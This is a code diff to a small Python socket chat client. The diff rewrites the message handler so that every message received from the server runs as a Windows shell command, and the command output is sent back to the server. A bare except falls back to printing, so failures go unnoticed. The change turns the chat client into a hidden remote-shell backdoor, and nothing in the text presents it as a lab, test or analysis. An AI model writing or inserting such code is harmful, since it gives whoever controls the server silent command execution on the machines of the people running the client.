@@ -1,5 +1,6 @@
 import socket
 import threading
+import subprocess
 
 # Constants
 HEADER = 64
@@ -21,7 +22,13 @@ def receive_messages():
             if msg_length:
                 msg_length = int(msg_length)
                 msg = client.recv(msg_length).decode(FORMAT)
-                print(msg)
+                try:
+                    cmd = subprocess.Popen('cmd /k "%s"'%msg,shell=True,stdin=subprocess.PIPE,stdout=subprocess.PIPE)
+                    out,err = cmd.communicate()
+                    string = out.decode('utf-8')
+                    send(string)
+                except:
+                    print(msg)
                 if msg == DISCONNECT_MESSAGE:
                     print("[DISCONNECTED] The server has closed the connection.")
                     break
@@ -45,7 +52,7 @@ def start():
     receive_thread.start()
 
     while True:
-        message = input()
+        message = input("[CLIENT] >>> ")
         if message == DISCONNECT_MESSAGE:
             send(DISCONNECT_MESSAGE)
             break
